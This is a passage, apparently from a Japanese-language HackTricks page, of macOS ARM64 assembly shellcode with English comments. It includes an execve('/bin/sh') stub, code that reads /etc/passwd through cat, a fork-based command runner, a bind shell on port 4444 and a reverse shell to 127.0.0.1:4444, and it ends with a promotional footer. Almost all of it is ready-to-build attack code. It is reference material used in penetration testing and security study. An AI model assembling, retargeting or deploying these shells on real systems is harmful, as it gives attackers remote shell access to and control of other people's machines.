movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### catコマンドで読み込む

目標は、`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。したがって、2番目の引数（x1）はパラメータの配列でなければなりません（メモリ内ではアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### メインプロセスが終了しないように、フォークからshを使用してコマンドを呼び出す
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s)から**ポート4444**でのバインドシェル
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 逆シェル

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)から、**127.0.0.1:4444**へのrevshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
